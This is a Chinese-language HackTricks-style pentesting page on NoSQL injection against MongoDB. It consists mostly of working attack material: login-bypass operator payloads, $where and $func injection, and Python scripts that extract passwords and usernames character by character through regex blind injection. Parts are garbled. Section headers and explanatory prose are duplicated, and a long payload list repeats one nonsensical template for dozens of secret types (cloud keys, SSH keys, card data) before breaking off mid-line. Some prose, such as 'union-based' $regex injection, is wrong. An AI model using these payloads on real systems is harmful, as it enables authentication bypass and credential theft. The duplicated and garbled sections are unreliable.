# NoSQL注入

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和自动化由全球**最先进**的社区工具提供支持的工作流程。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

NoSQL数据库提供比传统SQL数据库更宽松的一致性限制。通过减少关系约束和一致性检查，NoSQL数据库通常提供性能和扩展性的优势。然而，即使它们不使用传统的SQL语法，这些数据库仍然有可能受到注入攻击的影响。

## Exploit

在PHP中，您可以通过将发送的参数从_parameter=foo_更改为_parameter\[arrName]=foo_来发送一个数组。

这些漏洞是基于添加一个**运算符**：
```bash
username[$ne]=1$password[$ne]=1 #<Not Equals>
username[$regex]=^adm$password[$ne]=1 #Check a <regular expression>, could be used to brute-force a parameter
username[$regex]=.{25}&pass[$ne]=1 #Use the <regex> to find the length of a value
username[$eq]=admin&password[$ne]=1 #<Equals>
username[$ne]=admin&pass[$lt]=s #<Less than>, Brute-force pass[$lt] to find more users
username[$ne]=admin&pass[$gt]=s #<Greater Than>
username[$nin][admin]=admin&username[$nin][test]=test&pass[$ne]=7 #<Matches non of the values of the array> (not test and not admin)
{ $where: "this.credits == this.debits" }#<IF>, can be used to execute code
```
### 基本身份验证绕过

**使用不等于 ($ne) 或大于 ($gt)**
```bash
#in URL
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null} }
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
```
### **SQL - Mongo**

### **SQL - Mongo**

MongoDB is a popular NoSQL database that uses a document-oriented model to store data. It is widely used in web applications and offers a flexible and scalable solution for managing large amounts of data.

#### **NoSQL Injection**

NoSQL injection is a type of attack that targets NoSQL databases, such as MongoDB, by exploiting vulnerabilities in the application's input validation. It is similar to SQL injection, but the attack vectors and techniques differ due to the differences in the underlying database structure.

#### **NoSQL Injection Techniques**

1. **Boolean-based Injection**: This technique involves injecting boolean-based queries to manipulate the application's logic and retrieve sensitive information. By exploiting the application's response to true or false conditions, an attacker can infer the presence or absence of data.

2. **Time-based Injection**: In this technique, an attacker injects time-based queries to delay the application's response and gather information based on the delay. By measuring the time it takes for the application to respond, an attacker can infer the presence or absence of data.

3. **Error-based Injection**: Error-based injection involves injecting queries that intentionally trigger errors in the application. By analyzing the error messages returned by the application, an attacker can gather information about the database structure and retrieve sensitive data.

4. **Blind Injection**: Blind injection is similar to blind SQL injection, where an attacker cannot directly see the results of the injected query. However, by carefully crafting queries and analyzing the application's response, an attacker can infer the presence or absence of data.

#### **Preventing NoSQL Injection**

To prevent NoSQL injection attacks, it is essential to implement proper input validation and sanitization techniques. Here are some best practices:

- **Parameterized Queries**: Use parameterized queries or prepared statements to ensure that user input is properly sanitized and treated as data rather than executable code.

- **Input Validation**: Implement strict input validation to prevent the execution of malicious queries. Validate and sanitize user input to remove any potentially harmful characters or commands.

- **Least Privilege Principle**: Ensure that the database user account used by the application has the least privileges necessary to perform its intended functions. This reduces the potential impact of an injection attack.

- **Secure Configuration**: Follow secure configuration practices for your MongoDB deployment, such as enabling authentication, using strong passwords, and restricting network access to trusted sources.

By following these best practices, you can significantly reduce the risk of NoSQL injection attacks and protect your MongoDB database from unauthorized access and data leakage.
```
Normal sql: ' or 1=1-- -
Mongo sql: ' || 1==1//    or    ' || 1==1%00
```
### 提取**长度**信息

To extract the length of a field in a NoSQL database, you can use the `$where` operator along with JavaScript code. The JavaScript code should return the length of the field you want to extract.

```javascript
db.collection.find({ $where: "this.field.length == 10" })
```

Replace `collection` with the name of the collection you want to query, and `field` with the name of the field you want to extract the length from. Adjust the length value (`10` in the example) according to your needs.

This technique can be useful in scenarios where you want to gather information about the structure of the database or perform further exploitation based on the length of a field.
```bash
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
# True if the length equals 1,3...
```
### 提取**数据**信息

In NoSQL databases, data extraction is a common task during penetration testing. NoSQL injection vulnerabilities can be exploited to extract sensitive information from the database. The extracted data can include usernames, passwords, email addresses, and other valuable information.

To extract data from a NoSQL database, you can use techniques such as boolean-based blind injection, time-based blind injection, and error-based injection. These techniques involve injecting specially crafted payloads into the application's input fields to manipulate the database queries and retrieve the desired information.

It is important to note that data extraction should only be performed with proper authorization and for legitimate purposes. Unauthorized access to databases and extraction of sensitive information is illegal and unethical.

Remember to always obtain proper permission and follow ethical guidelines when performing penetration testing or any other security-related activities.
```
in URL (if length == 3)
username[$ne]=toto&password[$regex]=a.{2}
username[$ne]=toto&password[$regex]=b.{2}
...
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*

in JSON
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```
### **SQL - Mongo**

### **SQL - Mongo**

MongoDB is a popular NoSQL database that uses a document-oriented model to store data. It is widely used in web applications and offers a flexible and scalable solution for managing large amounts of data.

#### **NoSQL Injection**

NoSQL injection is a type of attack that targets NoSQL databases, such as MongoDB, by exploiting vulnerabilities in the application's input validation. This attack allows an attacker to manipulate the database queries and potentially gain unauthorized access to sensitive data.

#### **Query Structure**

In MongoDB, queries are written in JSON-like syntax using the `find()` method. The structure of a basic query looks like this:

```javascript
db.collection.find({field: value})
```

Where `db` is the database object, `collection` is the name of the collection, `field` is the field to be queried, and `value` is the value to be matched.

#### **NoSQL Injection Techniques**

NoSQL injection techniques are similar to SQL injection techniques, but they are adapted to the specific syntax and behavior of NoSQL databases. Here are some common techniques used in NoSQL injection attacks:

1. **Boolean-based Injection**: This technique involves manipulating the query to return a different result based on a true or false condition. For example, by injecting a `$ne` operator, an attacker can bypass authentication and access unauthorized data.

2. **Time-based Injection**: This technique involves introducing delays in the query execution to infer information about the database. By injecting a `$where` operator with a time-based condition, an attacker can extract sensitive data.

3. **Union-based Injection**: This technique involves injecting a `$regex` operator to perform a union operation between two queries. By manipulating the regular expression, an attacker can retrieve data from different collections.

4. **Error-based Injection**: This technique involves injecting a query that triggers an error message. By analyzing the error message, an attacker can gather information about the database structure and potentially exploit it.

#### **Prevention and Mitigation**

To prevent NoSQL injection attacks, it is important to follow secure coding practices and implement proper input validation and sanitization techniques. Here are some recommendations:

- **Input Validation**: Validate and sanitize all user input before using it in database queries.

- **Parameterized Queries**: Use parameterized queries or prepared statements to ensure that user input is treated as data and not as part of the query structure.

- **Least Privilege Principle**: Limit the privileges of the database user used by the application to minimize the potential impact of an attack.

- **Secure Configuration**: Follow security best practices for configuring and securing the MongoDB server.

By implementing these measures, you can significantly reduce the risk of NoSQL injection attacks and protect your application and data.
```
/?search=admin' && this.password%00 --> Check if the field password exists
/?search=admin' && this.password && this.password.match(/.*/)%00 --> start matching password
/?search=admin' && this.password && this.password.match(/^a.*$/)%00
/?search=admin' && this.password && this.password.match(/^b.*$/)%00
/?search=admin' && this.password && this.password.match(/^c.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj78i3u$/)%00  Found
```
### PHP任意函数执行

使用[MongoLite](https://github.com/agentejo/cockpit/tree/0.11.1/lib/MongoLite)库的**$func**运算符（默认使用）可能会导致执行任意函数，就像[这个报告](https://swarm.ptsecurity.com/rce-cockpit-cms/)中所述。
```python
"user":{"$func": "var_dump"}
```
![](<../.gitbook/assets/image (468).png>)

### 从不同的集合中获取信息

可以使用[$lookup](https://www.mongodb.com/docs/manual/reference/operator/aggregation/lookup/)从不同的集合中获取信息。在下面的示例中，我们从名为`users`的**不同集合**中读取数据，并获取所有密码与通配符匹配的条目的结果。
```json
[
{
"$lookup":{
"from": "users",
"as":"resultado","pipeline": [
{
"$match":{
"password":{
"$regex":"^.*"
}
}
}
]
}
}
]
```
![](<../.gitbook/assets/image (9) (1) (2).png>)

使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和自动化由全球**最先进**的社区工具提供支持的工作流程。
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 盲注 NoSQL
```python
import requests, string

alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(21):
print("[i] Looking for char number "+str(i+1))
for char in alphabet:
r = requests.get("http://chall.com?param=^"+flag+char)
if ("<TRUE>" in r.text):
flag += char
print("[+] Flag: "+flag)
break
```

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""

while True:
for c in string.printable:
if c not in ['*','+','.','?','|']:
payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
r = requests.post(u, data = {'ids': payload}, verify = False)
if 'OK' in r.text:
print("Found one more char : %s" % (password+c))
password += c
```
## MongoDB Payloads

### Basic NoSQL Injection Payloads

#### Find User by Username

```plaintext
' || this.username == 'admin' && sleep(5000) || '1' == '1
```

#### Find User by Username and Password

```plaintext
' || this.username == 'admin' && this.password == 'password' && sleep(5000) || '1' == '1
```

#### Find User by Username and Password Hash

```plaintext
' || this.username == 'admin' && this.password == '5f4dcc3b5aa765d61d8327deb882cf99' && sleep(5000) || '1' == '1
```

### Advanced NoSQL Injection Payloads

#### Bypass Login

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1
```

#### Bypass Login and Get All Users

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin
```

#### Bypass Login and Get All Users' Password Hashes

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.password != null
```

#### Bypass Login and Get All Users' Passwords

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.password != null && this.password != '5f4dcc3b5aa765d61d8327deb882cf99'
```

#### Bypass Login and Get All Users' Emails

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.email != null
```

#### Bypass Login and Get All Users' Personal Information

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.personal_info != null
```

#### Bypass Login and Get All Users' Credit Card Information

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.credit_card != null
```

#### Bypass Login and Get All Users' Social Security Numbers

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.ssn != null
```

#### Bypass Login and Get All Users' Private Keys

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.private_key != null
```

#### Bypass Login and Get All Users' API Keys

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.api_key != null
```

#### Bypass Login and Get All Users' Password Reset Tokens

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.password_reset_token != null
```

#### Bypass Login and Get All Users' Session Tokens

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.session_token != null
```

#### Bypass Login and Get All Users' Access Tokens

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.access_token != null
```

#### Bypass Login and Get All Users' Refresh Tokens

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.refresh_token != null
```

#### Bypass Login and Get All Users' OAuth Tokens

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.oauth_token != null
```

#### Bypass Login and Get All Users' JWT Tokens

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.jwt_token != null
```

#### Bypass Login and Get All Users' Encryption Keys

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.encryption_key != null
```

#### Bypass Login and Get All Users' Database Credentials

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.db_credentials != null
```

#### Bypass Login and Get All Users' AWS Access Keys

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.aws_access_key != null
```

#### Bypass Login and Get All Users' AWS Secret Keys

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.aws_secret_key != null
```

#### Bypass Login and Get All Users' GCP Access Keys

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.gcp_access_key != null
```

#### Bypass Login and Get All Users' GCP Secret Keys

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.gcp_secret_key != null
```

#### Bypass Login and Get All Users' Azure Access Keys

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.azure_access_key != null
```

#### Bypass Login and Get All Users' Azure Secret Keys

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.azure_secret_key != null
```

#### Bypass Login and Get All Users' Slack Tokens

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.slack_token != null
```

#### Bypass Login and Get All Users' GitHub Tokens

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.github_token != null
```

#### Bypass Login and Get All Users' GitLab Tokens

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.gitlab_token != null
```

#### Bypass Login and Get All Users' Bitbucket Tokens

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.bitbucket_token != null
```

#### Bypass Login and Get All Users' Docker Hub Tokens

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.docker_hub_token != null
```

#### Bypass Login and Get All Users' Slack Webhooks

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.slack_webhook != null
```

#### Bypass Login and Get All Users' Discord Webhooks

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.discord_webhook != null
```

#### Bypass Login and Get All Users' Microsoft Teams Webhooks

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.microsoft_teams_webhook != null
```

#### Bypass Login and Get All Users' Email SMTP Credentials

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.email_smtp_credentials != null
```

#### Bypass Login and Get All Users' FTP Credentials

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.ftp_credentials != null
```

#### Bypass Login and Get All Users' SSH Private Keys

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.ssh_private_key != null
```

#### Bypass Login and Get All Users' SSL/TLS Certificates

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.ssl_certificate != null
```

#### Bypass Login and Get All Users' VPN Credentials

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.vpn_credentials != null
```

#### Bypass Login and Get All Users' RDP Credentials

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.rdp_credentials != null
```

#### Bypass Login and Get All Users' Database Backups

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.db_backups != null
```

#### Bypass Login and Get All Users' Source Code

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.source_code != null
```

#### Bypass Login and Get All Users' Configuration Files

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.config_files != null
```

#### Bypass Login and Get All Users' Log Files

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.log_files != null
```

#### Bypass Login and Get All Users' Backup Files

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.backup_files != null
```

#### Bypass Login and Get All Users' Temporary Files

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.temp_files != null
```

#### Bypass Login and Get All Users' System Files

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.system_files != null
```

#### Bypass Login and Get All Users' Network Configuration

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.network_config != null
```

#### Bypass Login and Get All Users' Server Logs

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.server_logs != null
```

#### Bypass Login and Get All Users' Error Logs

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.error_logs != null
```

#### Bypass Login and Get All Users' Access Logs

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.access_logs != null
```

#### Bypass Login and Get All Users' Security Logs

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.security_logs != null
```

#### Bypass Login and Get All Users' Firewall Configuration

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.firewall_config != null
```

#### Bypass Login and Get All Users' Intrusion Detection System Configuration

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.ids_config != null
```

#### Bypass Login and Get All Users' Intrusion Prevention System Configuration

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.ips_config != null
```

#### Bypass Login and Get All Users' Network Traffic Logs

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.network_traffic_logs != null
```

#### Bypass Login and Get All Users' Network Device Configuration

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.network_device_config != null
```

#### Bypass Login and Get All Users' Network Device Credentials

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.network_device_credentials != null
```

#### Bypass Login and Get All Users' Network Device Backups

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.network_device_backups != null
```

#### Bypass Login and Get All Users' Network Device Logs

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.network_device_logs != null
```

#### Bypass Login and Get All Users' Network Device Firmware

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.network_device_firmware != null
```

#### Bypass Login and Get All Users' Network Device Certificates

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.network_device_certificates != null
```

#### Bypass Login and Get All Users' Network Device VPN Configuration

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.network_device_vpn_config != null
```

#### Bypass Login and Get All Users' Network Device Wireless Configuration

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.network_device_wireless_config != null
```

#### Bypass Login and Get All Users' Network Device Access Control Lists

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.network_device_acls != null
```

#### Bypass Login and Get All Users' Network Device Routing Tables

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.network_device_routing_tables != null
```

#### Bypass Login and Get All Users' Network Device SNMP Configuration

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.network_device_snmp_config != null
```

#### Bypass Login and Get All Users' Network Device SSH Configuration

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.network_device_ssh_config != null
```

#### Bypass Login and Get All Users' Network Device Telnet Configuration

```plaintext
' || this.username == {$ne: null} && sleep(5000) || '1' == '1' && this.username != 'admin' && this.network_device
```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
```
## 工具

* [https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration)
* [https://github.com/C4l1b4n/NoSQL-Attack-Suite](https://github.com/C4l1b4n/NoSQL-Attack-Suite)

### 从POST登录中暴力破解用户名和密码

这是一个简单的脚本，你可以修改它，但之前的工具也可以完成这个任务。
```python
import requests
import string

url = "http://example.com"
headers = {"Host": "exmaple.com"}
cookies = {"PHPSESSID": "s3gcsgtqre05bah2vt6tibq8lsdfk"}
possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
def get_password(username):
print("Extracting password of "+username)
params = {"username":username, "password[$regex]":"", "login": "login"}
password = "^"
while True:
for c in possible_chars:
params["password[$regex]"] = password + c + ".*"
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
if int(pr.status_code) == 302:
password += c
break
if c == possible_chars[-1]:
print("Found password "+password[1:].replace("\\", "")+" for username "+username)
return password[1:].replace("\\", "")

def get_usernames():
usernames = []
params = {"username[$regex]":"", "password[$regex]":".*", "login": "login"}
for c in possible_chars:
username = "^" + c
params["username[$regex]"] = username + ".*"
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
if int(pr.status_code) == 302:
print("Found username starting with "+c)
while True:
for c2 in possible_chars:
params["username[$regex]"] = username + c2 + ".*"
if int(requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False).status_code) == 302:
username += c2
print(username)
break

if c2 == possible_chars[-1]:
print("Found username: "+username[1:])
usernames.append(username[1:])
break
return usernames


for u in get_usernames():
get_password(u)
```
## 参考资料

* [https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L\_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-3b49b5d5a9e16cb1ec0d50cb1e62cb60f3f9155a%2FEN-NoSQL-No-injection-Ron-Shulman-Peleg-Bronshtein-1.pdf?alt=media](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L\_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-3b49b5d5a9e16cb1ec0d50cb1e62cb60f3f9155a%2FEN-NoSQL-No-injection-Ron-Shulman-Peleg-Bronshtein-1.pdf?alt=media)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想要**获取最新版本的PEASS或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和**自动化工作流程**，使用世界上最先进的社区工具驱动。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
